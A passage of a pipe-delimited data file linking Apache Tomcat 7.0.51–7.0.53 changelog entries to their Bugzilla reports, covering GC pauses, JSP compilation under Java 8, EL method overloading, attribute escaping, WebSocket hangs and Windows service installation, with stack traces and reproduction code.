             } else if (res == 0 && !block) {"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56172
Coyote|Tomcat 7.0.53 (violetagg)|fix|56213|Reduce garbage collection when the NIO connector is under heavy load. (markt)|Many KeyReference Objects Cause Long CMS-remark GC Times|"This is a request to prop the following fix to Tomcat 7.

http://svn.apache.org/viewvc?diff_format=h&view=revision&revision=1388890

Using the NIO connector with a WebSocket application many (millions of) KeyReference objects are  created under traffic.  While the objects are small, the sheer number of them seems to overwhelm the CMS collector.  Before the above fix with our application the CMS remark stop the world phase was taking up to 8.8 seconds.

716.463: [GC[YG occupancy: 213377 K (392896 K)]716.463: [Rescan (parallel) , 5.7904380 secs]722.253: [weak refs processing, 2.3101000 secs] [1 CMS-remark: 1160677K(1703936K)] 1374054K(2096832K), 8.8005960 secs] [Times: user=107.17 sys=0.00, real=8.80 secs] 
Total time for which application threads were stopped: 8.8020690 seconds

After applying the fix under the same traffic the time drops to 110ms.

1282.459: [GC[YG occupancy: 203760 K (392896 K)]1282.459: [Rescan (parallel) , 0.0594610 secs]1282.519: [weak refs processing, 0.0452530 secs] [1 CMS-remark: 1159948K(1703936K)] 1363708K(2096832K), 0.1084940 secs] [Times: user=1.12 sys=0.00, real=0.11 secs] 
Total time for which application threads were stopped: 0.1100650 seconds

For a real time application the 9 second pause is a killer.

These tests were executed under:
RHEL 6.4
java version ""1.6.0_65""
Java(TM) SE Runtime Environment (build 1.6.0_65-b14-BR8013809)
Java HotSpot(TM) 64-Bit Server VM (build 20.65-b04, mixed mode)

With the following JVM parms:
 -server
 -XX:NewSize=384m
 -XX:MaxNewSize=384m
 -XX:+UseParNewGC
 -XX:MaxTenuringThreshold=0
 -Xms2048m
 -Xmx2048m
 -XX:+UseConcMarkSweepGC
 -XX:CMSInitiatingOccupancyFraction=68
 -XX:+UseCMSInitiatingOccupancyOnly
 -XX:PermSize=96m
 -XX:MaxPermSize=96m
 -XX:+UseMembar
 -XX:+HeapDumpOnOutOfMemoryError
 -XX:+PrintClassHistogram"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56213
Coyote|Tomcat 7.0.53 (violetagg)|fix||Fix CVE-2014-0075: Improve processing of chuck size from chunked headers. Avoid overflow and use a bit shift instead of a multiplication as it is marginally faster. (markt/kkolinko)|||
Coyote|Tomcat 7.0.53 (violetagg)|fix||Fix CVE-2014-0099: Fix possible overflow when parsing long values from a byte array. (markt)|||
Jasper|Tomcat 7.0.53 (violetagg)|fix|54475|Add Java 8 support to SMAP generation for JSPs. Patch by Robbie Gibson. (markt)|SMAP broken in Java 8 for JSP compile|"In order to compile JSPs with Java 8, I made the following additions to the JSP servlet in conf\web.xml:

        <init-param>
            <param-name>compiler</param-name>
            <param-value>modern</param-value>
        </init-param>
        <init-param>
            <param-name>compilerSourceVM</param-name>
            <param-value>1.8</param-value>
        </init-param>
        <init-param>
            <param-name>compilerTargetVM</param-name>
            <param-value>1.8</param-value>
        </init-param>

However, I get the following error:


org.apache.jasper.JasperException: org.apache.jasper.JasperException: Unable to compile class for JSP
	org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:549)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:378)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	...
Caused by java.io.IOException: unexpected tag: 18
	at org.apache.jasper.compiler.SmapUtil$SDEInstaller.copyConstantPool(SmapUtil.java:434)
	at org.apache.jasper.compiler.SmapUtil$SDEInstaller.addSDE(SmapUtil.java:251)
	at org.apache.jasper.compiler.SmapUtil$SDEInstaller.install(SmapUtil.java:223)
	at org.apache.jasper.compiler.SmapUtil$SDEInstaller.install(SmapUtil.java:200)
	at org.apache.jasper.compiler.SmapUtil.installSmap(SmapUtil.java:163)
	at org.apache.jasper.compiler.AntCompiler.generateClass(AntCompiler.java:284)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:378)
	...

If I also add the suppressSmap parameter to the JSP servlet in conf\web.xml, the error goes away, and the JSP compiles fine:

        <init-param>
            <param-name>suppressSmap</param-name>
            <param-value>true</param-value>
        </init-param>

Something about the SMAP is not playing well with Java 8 language features like the lambda expression."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54475
Jasper|Tomcat 7.0.53 (violetagg)|fix|55483|Improve handing of overloaded methods and constructors in expression language implementation. (markt)|ELException when object has overloaded methods|"Included below are two test cases which fail.  The first calls an overloaded method on an object.  The second calls an overloaded constructor.  More details below.


1.) Here's the first test.

   @Test
   public void test01() {
       ELProcessor processor = new ELProcessor();
       processor.defineBean(""sb"", new StringBuilder());
       Assert.assertEquals(""a"", processor.eval(""sb.append('a'); sb.toString()""));
   }

This fails with the following stack trace.

javax.el.ELException: Cannot convert a of type class java.lang.String to long
	at org.apache.el.lang.ELSupport.coerceToNumber(ELSupport.java:349)
	at org.apache.el.lang.ELSupport.coerceToNumber(ELSupport.java:328)
	at org.apache.el.lang.ELSupport.coerceToType(ELSupport.java:450)
	at org.apache.el.ExpressionFactoryImpl.coerceToType(ExpressionFactoryImpl.java:48)
	at javax.el.Util.buildParameters(Util.java:351)
	at javax.el.BeanELResolver.invoke(BeanELResolver.java:173)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:84)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:157)
	at org.apache.el.parser.AstSemicolon.getValue(AstSemicolon.java:35)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:188)
	at javax.el.ELProcessor.getValue(ELProcessor.java:45)
	at javax.el.ELProcessor.eval(ELProcessor.java:38)
	at org.apache.el.parser.TestAstMethodCalls.test01(TestAstMethodCalls.java:32)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:68)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
	at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
	at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197)

Looking into this, it appears that the EL is having trouble because StringBuilder's append method is overloaded.  It is instructed to call append with the character 'c', but instead is trying to coerce the character 'c' to a long and call append with the long.

This chain of events seems to be kicked off in AstValue.getValue() line #157, where it's calling resolver.invoke(..).  The call to resolver.invoke() is passing null as the paramTypes argument.  This trickles down to BeanELResolver.invoke(), which calls Util.findMethod().  Because paramTypes is null, Util.findMethod() selects the first method it finds with the expected number of arguments.  In the case above, it selects StringBuilder.append(long), which causes the problem above.



2.) Here's the second test.

   @Test
   public void test02() {
       ELProcessor processor = new ELProcessor();
       processor.getELManager().importClass(""java.util.Date"");
       Date result = (Date) processor.eval(""Date(86400)"");
       Assert.assertEquals(86400, result.getTime());
   }

This one fails intermittently with the following stack trace.

javax.el.ELException: java.lang.IllegalArgumentException
	at javax.el.StaticFieldELResolver.invoke(StaticFieldELResolver.java:118)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:84)
	at org.apache.el.parser.AstFunction.getValue(AstFunction.java:138)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:188)
	at javax.el.ELProcessor.getValue(ELProcessor.java:45)
	at javax.el.ELProcessor.eval(ELProcessor.java:38)
	at org.apache.el.parser.TestAstMethodCalls.test02(TestAstMethodCalls.java:39)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:263)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:68)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
	at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
	at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:50)
	at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:467)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:683)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:390)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:197)
Caused by: java.lang.IllegalArgumentException
	at java.util.Date.parse(Date.java:615)
	at java.util.Date.<init>(Date.java:272)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:526)
	at javax.el.StaticFieldELResolver.invoke(StaticFieldELResolver.java:111)
	... 29 more

Looking into this error, it seems similar to #1.  The difference is that AstFunction.getValue() line #138 is calling invoke on the resolver and passing null as the paramTypes.  This trickles down to the StaticFieldELResolver.invoke() method, which calls Util.findConstructor().  Again, because paramTypes is null, Util.findConstructor() searches the available constructors for the one with the same number of arguments.  The reason that this intermittently fails is because on my system, the call to Class.getConstructors() returns the list of constructs in an arbitrary order. So it fails when Date(String) is listed first, but succeeds when Date(long) is listed first."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55483
Jasper|Tomcat 7.0.53 (violetagg)|fix|56208|Restore the validateXml option to Jasper that was previously renamed validateTld. Both options are now supported. validateXml controls the validation of web.xml files when Jasper parses them and validateTld controls the validation of *.tld files when Jasper parses them. (markt)|validateXml attribute is missing in jasper Ant Task (JspC) in 6.0.39, 7.0.52|"Mail threads:

http://tomcat.markmail.org/thread/4gblbbzxltq5jpzw
http://tomcat.markmail.org/thread/ydrqotnjkmdl6err
http://tomcat.markmail.org/thread/sn5gkulktf7tteon

This has already been fixed in Tomcat 7 by r1570163 and will be in 7.0.53.

Note that starting with 7.0.53 ""validateXml"" and ""validateTld"" are two distinct options.

As of now ""validateXml"" option is removed from Tomcat 8 since 8.0.3 onwards. Some pending cleanup and discussion on whether to reimplement in Tomcat 8 is tracked as bug 56199.


If you are using validateXml=""false"", my recommendation is to just remove that attribute from your build files. (It does not serve anything, as ""false"" is the default value for this attribute).


A backport of r1570163 has been proposed for 6.0"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56208
Jasper|Tomcat 7.0.53 (violetagg)|fix|56223|Throw an IllegalStateException if a call is made to ServletContext.setInitParameter() after the ServletContext has been initialized. (markt)|ServletContext#setInitParameter(..) does not throw IllegalStateException after it's been initialized|"Created attachment 31369 [details]
.war with single Servlet

The Java EE javadoc for ServletContext#setInitParameter(String, String), here: http://docs.oracle.com/javaee/7/api/javax/servlet/ServletContext.html#setInitParameter(java.lang.String, java.lang.String), states that the method should throw an IllegalStateException if the ServletContext has already been initialized.

Once a Servlet is ready to handle requests, the ServletContext must have been initialized. However, no exception is thrown if you try to invoke the method in an HttpServlet's doGet(..).

Steps to reproduce:

1) Add an HttpServlet that invokes the method in its doGet(..) method

@WebServlet(urlPatterns = ""/init"")
public class InitParameterServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {

		ServletContext context = getServletContext();
		context.setInitParameter(""init-param"", ""value"");

	}
}

2) Send an HTTP GET request to (the appropriate) 'http://localhost:8080/context/init`.

Actual results: No exception is thrown. Server sends back 200 OK.

Expected results: An exception should have been thrown. Server should have sent back 500 status code.

Tomcat 8.0.3 (and 7.0.42) and Windows 7

Additional information: You can also try calling, for example, the addFilter(..) method which will fail stating that the ServletContext is already initialized."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56223
Jasper|Tomcat 7.0.53 (violetagg)|fix|56265|Do not escape values of dynamic tag attributes containing EL expressions. (kkolinko)|Unexpected escaping in the values of dynamic tag attributes containing EL expressions|"The following was reported on the users list,
""double xmlEscape in dynamic attributes in 7.0.52""
http://marc.info/?t=139479709800007&r=1&w=2

[quote]
Hi,
I have several custom jspx tags with dynamic attributes that worked well up to Tomcat 7.0.47, but they do not work properly on Tomcat 7.0.52. Same problems occur also when using Spring form tags (I suspect that other libraries would have same problem, but I didn't test them).

sample (data-test[2] is dynamic attribute, onclick is static):
<c:set var=""world"" value=""'World'""></c:set>
<sf:form onclick=""window.alert('Hello ${world}!')""
        data-test=""window.alert('Hello ${world}!')""
        data-test2=""window.alert('Hello World!')""
tomcat 7.0.47 output:
<form onclick=""window.alert(&#39;Hello &#39;World&#39;!&#39;)""
        data-test=""window.alert(&#39;Hello &#39;World&#39;!&#39;)""
        data-test2=""window.alert(&#39;Hello World!&#39;)""
tomcat 7.0.52 output:
<form onclick=""window.alert(&#39;Hello &#39;World&#39;!&#39;)""
        data-test=""window.alert(&amp;#039;Hello &#39;World&#39;!&amp;#039;)""
        data-test2=""window.alert(&#39;Hello World!&#39;)""

If there is EL used in dynamic attribute (data-test), non-EL part of that attribute is escaped twice, EL part is escaped only once. Tomcat 7.0.47 would escape everything just once.
Everything works as before if static attribute is used (onclick) or there is no EL in dynamic attribute (data-test2).
[/quote]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56265
Jasper|Tomcat 7.0.53 (violetagg)|fix||Make the default compiler source and target versions for JSPs Java 6 since Tomcat 7 requires Java 6 as a minimum. (markt)|||
Jasper|Tomcat 7.0.53 (violetagg)|update|56283|"Update to the Eclipse JDT Compiler P20140317-1600 which adds support for Java 8 syntax to JSPs. Add support for value ""1.8"" for the compilerSourceVM and compilerTargetVM options. (markt)"|Add support for Java 8 to Jasper|"(Filing an already fixed issue, for better tracking).

Add support for Java 8 for JSP compilation in Tomcat. Allow to use ""1.8"" as the value for compilerSourceVM, compilerTargetVM options of JspServlet.

Implementing this feature means that Eclipse JDT compiler bundled with Tomcat have to be updated to a later version (beyond the 4.3.1 that we are using today).

From [1]:
[quote]
ÔªøEclipse support for Java‚Ñ¢ 8: Starting with I20140318-0830 all our Luna (4.4) builds contain the Eclipse support for Java‚Ñ¢ 8. For Kepler SR2 (4.3.2) a feature patch is available (P20140317-1600).
[/quote]

As of now, the latest builds of Eclipse are [1]:
1) 4.3.2  - 21 Feb 2014
2) 4.4M6  - 6 March 2014
3) I20140318-0830 - 18 Mar 2014  (""I"": an integration build)
4) N20140318-2000 - 18 Mar 2014  (""N"": a nightly build)
5) P20140317-1600 - 17 Mar 2014  (Patch build for 4.3.2) -> [2]

[2] ""Eclipse 4.3.2 Patch Build: P20140317-1600""
Explains what this patch build is, and provides download links.

[3] JDT/Eclipse Java 8 Support For Kepler
(A wiki page).

I think it s bit unfortunate that the build number is ""P20140317-1600"", without any explicit mention of ""4.3"" branch in the number, but that is how they did it.


[1] http://download.eclipse.org/eclipse/downloads/
[2] http://download.eclipse.org/eclipse/downloads/drops4/P20140317-1600/
[3] https://wiki.eclipse.org/JDT/Eclipse_Java_8_Support_For_Kepler"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56283
WebSocket|Tomcat 7.0.53 (violetagg)|fix||Avoid a possible deadlock when one thread is shutting down a connection while another thread is trying to write to it. (markt)|||
WebSocket|Tomcat 7.0.53 (violetagg)|fix||Call onError if an exception is thrown calling onClose when closing a session. (remm)|||
Web applications|Tomcat 7.0.53 (violetagg)|code||In the documentation: add support for several documentation tags from Tomcat 8. Such as <version-major/>. (kkolinko)|||
Web applications|Tomcat 7.0.53 (violetagg)|add|56093|Add the SSL Valve to the documentation web application. (markt)|"org.apache.catalina.valves.SSLValve is not documented on the ""Valves"" page"|Just need to add documentation to the users' guide, or the configuration/valves page.|https://bz.apache.org/bugzilla/show_bug.cgi?id=56093
Web applications|Tomcat 7.0.53 (violetagg)|fix|56217|Improve readability by using left alignment for the table cell containing the request information on the Manager application status page. (markt)|Regarding Tomcat Manager Application Status Page|"Created attachment 31366 [details]
Tomcat Managet Status Page Screenshot

In Tomcat Manager Status Page, please make ""Request"" as Left align.

Currently ""Request"" column is Center align due to which if there are links with larger in length (Links with GET method) could not display in Desktop Screen. To view these links, horizonatal scrollbar has to use.

If we could make it Left align, all links could be viewed in screen (atleast starting points of links).

Screenshot attached for more clarity and reference."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56217
Web applications|Tomcat 7.0.53 (violetagg)|fix||"Fixed java.lang.NegativeArraySizeException when using ""Expire sessions"" command in the manager web application on a context where the session timeout is disabled. (kfujino)"|||
Web applications|Tomcat 7.0.53 (violetagg)|fix||Add support for LAST_ACCESS_AT_START system property to Manager web application. (kfujino)|||
Web applications|Tomcat 7.0.53 (violetagg)|fix||Add definition of org.apache.catalina.ant.FindLeaksTask. (kfujino)|||
Web applications|Tomcat 7.0.53 (violetagg)|fix|56273|If the Manager web application does not perform an operation because the web application is already being serviced, report an error rather than reporting success. (markt)|Manager webapp: when command is skipped because web application is being serviced, say about it|"Looking at deploy/undeploy/upload methods in ManagerServlet, HtmlManagerServlet

The methods call ""if (!isServiced(name))""  and if the web application is being serviced (e.g. by another command running in parallel) the methods skip their work and report success.

Instead of that they should report that they skipped their work."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56273
Web applications|Tomcat 7.0.53 (violetagg)|fix|56304|Add a note to the documentation about not using WebSocket with BIO HTTP in production. (markt)|WebSocket send locks and timeout does not occur after 20 seconds|"Created attachment 31429 [details]
Extract from thread dump

Start a WebSocket server on one computer.
Connect from aonther using a browser.
Starts sending messages from server to client periodically.

Turn off wifi or unplug network cable on client side. Initially Tomcat appears 
to be sending messages but eventually one of the sends hangs indefinitely.

The 20 second timeout as documented on the WebSocket FAQ does not occur and attempts to close the WebSocket session from another thread also locks that thread as well.

If you now turn the wifi back on or plug the network cable, at last the two threads that are stuck are released and the WebSocket handler gets a notification of the session closing.

In the attachment, the first two stack traces are of (1) the thread trying to send and (2) the thread that attempted to close. The 3rd stack trace is of another hung thread.

NOTE that this does not occur on Tomcat 8 where the timout does occur and also attempts to close a session do succeed.

Also I am told that the timeout does occur on Windows but I haven't verified it myself. I am using Linux."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56304
Other|Tomcat 7.0.53 (violetagg)|fix|56143|Improve service.bat so that it can be launched from a non-UAC console. This includes using a single call to tomcat7.exe to install the Windows service rather than three calls, and using command line arguments instead of environment variables to pass the settings. (markt/kkolinko)|"Allow ""service.bat install"" to be used in an non-UAC cmd.exe session"|"If you use a Microsoft Windows OS that has UAC and use service.bat script to install Tomcat as a service, you have to first launch command console (cmd.exe) in elevated privileges mode (""Run as administrator"") and then call ""service.bat install"" from there.

This requirement is mentioned in Tomcat documentation:
http://tomcat.apache.org/tomcat-7.0-doc/windows-service-howto.html#Installing_services

[quote]
NOTE: On Windows Vista or any other operating system with User Account Control (UAC) you must either disable UAC or right-click on cmd.exe and select ""Run as administrator"" in order to run this script. If UAC is enabled being logged on with an Administrator account is not sufficient. 
[/quote]



If you forget to launch cmd.exe in that mode and just run ""service.bat install"",  with the current Tomcat versions (6.0.39, 7.0.50, 8.0.3) you will be prompted 3 times by UAC [3], but the service will be installed incorrectly.

With r1565781 / r1567742 (7.0.52) this was improved and you will be prompted by UAC only once, but still the service will be installed incorrectly.


The cause for this behaviour is that install command in service.bat script uses environment variables (such as PR_CLASSPATH) to pass parameters to service installer (prunsrv).[1] Apparently, when a child application is launched with elevated privileges it does not inherit environment variables from its parent. [2]

The consequence is that a number of crucial settings in the installed service will be blank. For example, its classpath and its log path will be blank.

As a result, an attempt to launch such service will fail shortly and silently, as Tomcat bootstrap classes are not found and logging is not configured either.

(There will be some logs in %SystemRoot%\system32\LogFiles\Apache  though).


A workaround is to fix such configuration by using service configuration application (tomcat7w.exe) to configure missing options.


I hope that this can be solved by changing service.bat so that all necessary options are passed as command-line arguments instead of variables.

For reference:
[1] Apache Commons Daemon documentation
http://commons.apache.org/proper/commons-daemon/procrun.html

[2] ""Re: r1567742"" thread on dev mailing list
http://tomcat.markmail.org/thread/tjmwxc5vb5ut4zuq

[3] Bug 56079
https://issues.apache.org/bugzilla/show_bug.cgi?id=56079#c6"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56143
Other|Tomcat 7.0.53 (violetagg)|fix||"Fix regression in 7.0.52: when using service.bat install to install the service the values for --StdOutput, --StdError options were passed as blank instead of ""auto"". (kkolinko)"|||
Other|Tomcat 7.0.53 (violetagg)|fix||Align options between service.bat and exe Windows installer. For service.bat the changes are in --Classpath, --DisplayName, --StartPath, --StopPath. For exe installer the changes are in --JvmMs, --JvmMx options, which are now 128 Mb and 256 Mb respectively instead of being empty. Explicitly specify --LogPath path when uninstalling Windows service, avoiding default value for that option. (kkolinko)|||
Other|Tomcat 7.0.53 (violetagg)|code||Simplify Windows *.bat files: remove %OS% checks, as java 6 does not run on ancient non-NT operating systems. (kkolinko)|||
Other|Tomcat 7.0.53 (violetagg)|fix|56137|Explicitly use the BIO connector in the SSL example in server.xml so it doesn't break if APR is enabled. (markt)|"Change HTTPS connector example (protocol attribute) from ""HTTP/1.1"" to Http11NioProtocol"|"HTTPS example connector in server.xml uses JSSE-specific attributes, but it also uses connector auto-selection using attribute protocol=""HTTP/1.1"".

If a user follows the ""Quick start"" section of ""SSL Configuration HOW-TO"", and previously, or after that installs APR, HTTPS connector won't work. That breaks the principle of least astonishment.


Proposal: in HTTPS example connector, change protocol=""HTTP/1.1"" to protocol=""org.apache.coyote.http11.Http11NioProtocol"".

It is not as beautiful as ""HTTP/1.1"", but it will cause less trouble for novices.

-Ognjen"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56137
Other|Tomcat 7.0.53 (violetagg)|fix|56139|Avoid a web application class loader leak in some unit tests when running on Windows. (markt)|"""SeedGenerator Thread"" warnings when running tests on Windows"|"Reviewing testsuite logs when running on Windows, I noted the following error messages:

<date, time> org.apache.catalina.loader.WebappClassLoader clearReferencesThreads
SEVERE: The web application [/foo] appears to have started a thread named [SeedGenerator Thread] but has failed to stop it. This is very likely to create a memory leak.

The above warning is from org.apache.catalina.authenticator.TestDigestAuthenticator, but there are other test cases that display it.

This is observed when testing on Windows 7 using
Tomcat 8.0.3 +Oracle Java 7u51 (32-bit)
Tomcat 7.0.52 +Oracle Java 6u45 (32-bit)
Tomcat 7.0.52 +Oracle Java 7u51 (32-bit)


Googling by the thread name, I found openjdk7 source code for sun.security.provider.SeedGenerator class at [1]

[1] http://www.docjar.com/html/api/sun/security/provider/SeedGenerator.java.html


To reproduce on an usual Tomcat instance, on Windows:
1). Create bin/setenv.bat:

set CATALINA_OPTS=-Djava.security.egd=file:/dev/./urandom

2). Start Tomcat. Note what web application was deployed and started first. In my case it is ""docs"".

3). Trigger reload or redeploy of the web application (touch its WEB-INF/web.xml, or rename docs -> docs1).

After this, an ""appears to have started a thread named [SeedGenerator Thread]"" message is logged in catalina.<date>.log file.

(It does not matter whether the application actually generates session ids. It matters that it was the first to start session id generator).



My conclusion:
===============
1. This is triggered by the following setting in build.properties.default file:
test.jvmarg.egd=-Djava.security.egd=file:/dev/./urandom

If the file ""/dev/urandom"" is not readable (e.g. on Windows, may be on some unix systems as well), SeedGenerator fallbacks to an algorithm that creates that ""SeedGenerator Thread"" thread.

2. Workaround:
Redefine this property in custom build.properties file.
Using any 1 of the following 2 lines works. The message disappears from test logs.

test.jvmarg.egd=-Djava.security.egd=file:/dev/urandom

test.jvmarg.egd=

(The ""file:/dev/urandom"" value is considered by SeedGenerator class as a special value, a marker to use native implementation of random seed generator).


Possible fixes:
================
1. Document this effect in places where ""java.security.egd"" property is mentioned.

A web application should not use such value of ""java.security.egd"" property when /dev/urandom is not readable.

(I know two places: Migration guide, ""FasterStartUp"" wiki page)

2. Fix configuration of the tests.

Maybe either document this in testing section of BUILDING.txt,
or move this property definition into build.xml, making it conditional on <available file=""/dev/urandom"">.

3. Can JreMemoryLeakPreventionListener guard against this?
Maybe it can, by creating a SecureRandom instance.

Generally, I see no need for such guard there, because trying to use /dev/urandom on a system where such file is not readable  is a blatant configuration error.


4. Can clearReferencesThreads turn a deaf ear to SeedGenerator thread?

I think it should not. I think it is a read issue that pins TCCL in memory."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56139
Other|Tomcat 7.0.53 (violetagg)|fix||Correct build script to avoid building JARs with empty packages. (markt)|||
Other|Tomcat 7.0.53 (violetagg)|add||Allow to limit JUnit test run to a number of selected test case methods. (kkolinko)|||
Other|Tomcat 7.0.53 (violetagg)|fix|56189|Remove used file cpappend.bat from the distribution. (markt)|Remove cpappend.bat|File bin/cpappend.bat seems to be needless. It is not called from any other script in bin/ directory. I assume it was used as a helper script to create classpath dynamically, but that is not necessery any more.|https://bz.apache.org/bugzilla/show_bug.cgi?id=56189
Catalina|Tomcat 7.0.52 (violetagg)|fix||Generate a valid root element for the effective web.xml for a web application for all supported versions of web.xml. (markt)|||
Coyote|Tomcat 7.0.52 (violetagg)|code||Pull up SocketWrapper to AbstractProcessor. (markt)|||
Coyote|Tomcat 7.0.52 (violetagg)|fix||In some circumstances asynchronous requests could time out too soon. (markt)|||
Catalina|Tomcat 7.0.51 (violetagg)|fix|55287|ServletContainerInitializer defined in the container may not be found. (markt/jboynes)|ServletContainerInitializer in parent classloader may not be found|"To include the JasperInitializer in the test environment I added an entry in testclasses/META-INF/services. This is not picked up when the parent classloader is searched because this path is a directory not a JAR file. 

It would be picked up if the ""scanAllDirectories"" extension was enabled but that should not be necessary if the search is to be semantically equivalent to j.u.ServiceLoader (which does locate it)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55287
Catalina|Tomcat 7.0.51 (violetagg)|fix|55855|Provide a per Context option (containerSciFilter) to exclude container SCIs. (markt)|Unexpected WsFilter is configured in a webapp that does not use WebSocket|"Reproducible in Tomcat 7 on 7.0.47 and on the current 7.0.x (@ r1548765).
I have not tested Tomcat 8.

Steps to reproduce:
1. Create the file webapps/ROOT/test.jsp in the default ROOT web application.
[[[
<% throw new RuntimeException(); %>
]]]

2. Configure JAVA_HOME to point to a Java 7 JRE (7u45).
3. Start Tomcat
4. Browse http://localhost:8080/test.jsp
The following stacktrace is printed on the error page and into the log files:
[[[
org.apache.jasper.JasperException: An exception occurred processing JSP page /test.jsp at line 1

1: <% throw new RuntimeException(); %>


Stacktrace:
	org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:568)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
]]]


The ""WsFilter"" in the stacktrace is unexpected, as the default ROOT web application does not use WebSockets."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55855
Catalina|Tomcat 7.0.51 (violetagg)|fix|55937|When deploying applications, treat a context path of /ROOT as equivalent to /. (markt)|Tomcat auto deployer not working for ROOT applications|"Created attachment 31162 [details]
catalina and localhost logs

I am trying to deploy a web app as the ROOT application for Tomcat 7, running on Ubuntu 12 with Amazon EC2. I experienced the problem with 7.0.35, 7.0.42, and 7.0.49.

